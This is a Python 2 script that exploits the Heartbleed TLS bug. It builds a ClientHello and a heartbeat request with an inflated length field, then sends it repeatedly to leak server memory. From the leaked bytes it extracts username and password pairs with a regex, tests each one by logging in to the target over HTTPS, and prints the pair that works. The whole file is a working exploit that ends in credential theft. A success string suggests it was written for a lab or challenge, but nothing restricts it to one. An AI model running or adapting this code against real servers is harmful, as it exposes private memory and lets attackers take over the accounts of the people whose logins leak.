#!/usr/bin/env python2

import socket, time, random, re, httplib, urllib, optparse
from struct import *


major = 3
minor = 3
hb_req_len = 0xffff


def create_client_hello():
        #struct {
        #    uint32 gmt_unix_time;
        #    opaque random_bytes[28];
        #} Random;
        rnd = pack('!I', int(time.time()))
        for i in range(28):
                rnd += pack('!B', random.randint(0, 255))

        #uint8 CipherSuite[2];
        #TLS_RSA_WITH_NULL_MD5                 = { 0x00,0x01 };
        #TLS_RSA_WITH_NULL_SHA                 = { 0x00,0x02 };
        #TLS_RSA_WITH_NULL_SHA256              = { 0x00,0x3B };
        #TLS_RSA_WITH_RC4_128_MD5              = { 0x00,0x04 };
        #TLS_RSA_WITH_RC4_128_SHA              = { 0x00,0x05 };
        #TLS_RSA_WITH_3DES_EDE_CBC_SHA         = { 0x00,0x0A };
        #TLS_RSA_WITH_AES_128_CBC_SHA          = { 0x00,0x2F };
        #TLS_RSA_WITH_AES_256_CBC_SHA          = { 0x00,0x35 };
        #TLS_RSA_WITH_AES_128_CBC_SHA256       = { 0x00,0x3C };
        #TLS_RSA_WITH_AES_256_CBC_SHA256       = { 0x00,0x3D };
        cipher_suite = pack('!HHHHHHHHHH', 0x01, 0x02, 0x3B, 0x04, 0x05, 0x0A, 0x2F, 0x35, 0x3C, 0x3D)

        #struct {
        #    ExtensionType extension_type = 15 (heartbeat)
        #    opaque extension_data<0..2^16-1>;
        #} Extension;
        #struct {
        #   HeartbeatMode mode = 1 (peer_allowed_to_send)
        #} HeartbeatExtension;
        hb_extension = pack('!HHB', 15, 1, 1)

        #struct {
        #    ProtocolVersion client_version;
        #    Random random;
        #    SessionID session_id = 0
        #    CipherSuite cipher_suites<2..2^16-2>;
        #    CompressionMethod compression_methods<1..2^8-1>;
        #    select (extensions_present) {
        #        case false:
        #            struct {};
        #        case true:
        #            Extension extensions<0..2^16-1>;
        #    };
        #} ClientHello;
        client_hello = pack('!BB', major , minor)
        client_hello += rnd
        client_hello += pack('!BH', 0, len(cipher_suite))
        client_hello += cipher_suite
        client_hello += pack('!BBH', 1, 0, len (hb_extension))
        client_hello += hb_extension

        #struct {
        #    HandshakeType msg_type;
        #    uint24 length;
        #    select (HandshakeType) {
        #        case client_hello:        ClientHello;
        #    } body;
        #} Handshake;
        handshake = pack('!BBH', 1, 0, len(client_hello))
        handshake += client_hello

        #struct {
        #    ContentType type = 22 (handshake)
        #    ProtocolVersion version = 3, 3 (TLS v1.2)
        #    uint16 length;
        #    opaque fragment[TLSPlaintext.length];
        #} TLSPlaintext;
        tls_plaintext = pack('!BBBH', 22, major, minor, len(handshake))
        tls_plaintext += handshake

        return tls_plaintext


def recv_server_hello(s):
        handshake_type = 0

        while handshake_type != 14: #server hello done
                tls_plaintext = s.recv(calcsize('!BBBH'))
                content_type, major, minor, length = unpack('!BBBH', tls_plaintext)

                handshake = s.recv(length)
                handshake_type, none, length = unpack('!BBH', handshake[:calcsize('!BBH')])

#struct {
#       HeartbeatMessageType type = 1 (request), 2 (response)
#       uint16 payload_length = ???
#       opaque payload[HeartbeatMessage.payload_length] = NOTHING
#       opaque padding[padding_length] = NOTHING
#} HeartbeatMessage;
def create_heartbeat():
        hb_message = pack('!BHI', 1, 4, 42)
        tls_plaintext = pack('!BBBH', 24, major, minor, len(hb_message))
        tls_plaintext += hb_message

        return tls_plaintext

def create_heartbleed():
        hb_message = pack('!BH', 1, hb_req_len)
        tls_plaintext = pack('!BBBH', 24, major, minor, len(hb_message))
        tls_plaintext += hb_message

        return tls_plaintext


def recv_heartbleed(s):
        payload = ''

        try:
                tls_plaintext = s.recv(calcsize('!BBBH'))
                content_type, major, minor, tls_length = unpack('!BBBH', tls_plaintext)

                hb_message = s.recv(calcsize('!BH'))
                hb_type, hb_length = unpack('!BH', hb_message)
                payload = s.recv(hb_length)
        except Exception as e:
                return None

        return payload


def check_credentials(conn, params, headers):
        conn.request("POST", "/", params, headers)
        response = conn.getresponse()
        if response.status != httplib.OK:
                return False

        data = response.read()
        if not data:
                return False

        if not re.search(r'You get it!!!', data):
                return False

        return True


def find_credentials(host, memory):
        valid_credentials = None

        credentials = re.findall(r'username=(.*?)&password=(.*?)&', memory)
        if len(credentials) == 0:
                return valid_credentials #None

        conn = httplib.HTTPSConnection(host)
        headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain"}

        for username, password in credentials:
                params = 'username={0}&password={1}&login_send=TRUE'.format(username, password)
                if check_credentials(conn, params, headers):
                        #print 'RAW {0} {1}'.format(username, password)
                        valid_credentials = urllib.unquote(username), urllib.unquote(password)
                        break

                params = urllib.urlencode({'username': username, 'password': password, 'login_send': 'TRUE'})
                if check_credentials(conn, params, headers):
                        #print 'ENCODED {0} {1}'.format(username, password)
                        valid_credentials = username, password
                        break

        conn.close()
        return valid_credentials #None if nothing found


if __name__ == '__main__':
        parser = optparse.OptionParser(usage='%prog HOST [OPTIONS]', description='Check TLS headrbleed and find valid credentials')
        parser.add_option('-p', '--port', action='store', type='int', default=443, help='TCP port')
        parser.add_option('-l', '--list', action='store_true', default=False, help='List credentials')
        (options, args) = parser.parse_args()

        if len(args) != 1:
                parser.error('HOST is mandatory')

        host = args[0]

        #craft TLS client hello message and heartbeat (heartbleed) message
        client_hello = create_client_hello()
        heartbleed = create_heartbleed()

        while True:
                #create and connect "plaintext" socket
                try:
                        plain_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        plain_socket.settimeout(5)
                        plain_socket.connect((host, options.port))
                except Exception as e:
                        print 'socket: {0} (errno = {1})'.format(e.strerror, e.errno)
                        exit(1)

                #send client hello, receive and throw away server hello message
                plain_socket.sendall(client_hello)
                recv_server_hello(plain_socket)

                #send headrtbleed, receive heartbeat response and store payload
                plain_socket.sendall(heartbleed)
                memory = recv_heartbleed(plain_socket)

                #close socket
                plain_socket.close()

                if not memory:
                        print 'vulnerable:no'
                        exit(0)
                elif not options.list:
                        print 'vulnerable:yes'
                        exit(0)

                credentials = find_credentials(host, memory)
                if credentials:
                        print 'username:{0};password:{1}'.format(credentials[0], credentials[1])
                        exit(0)
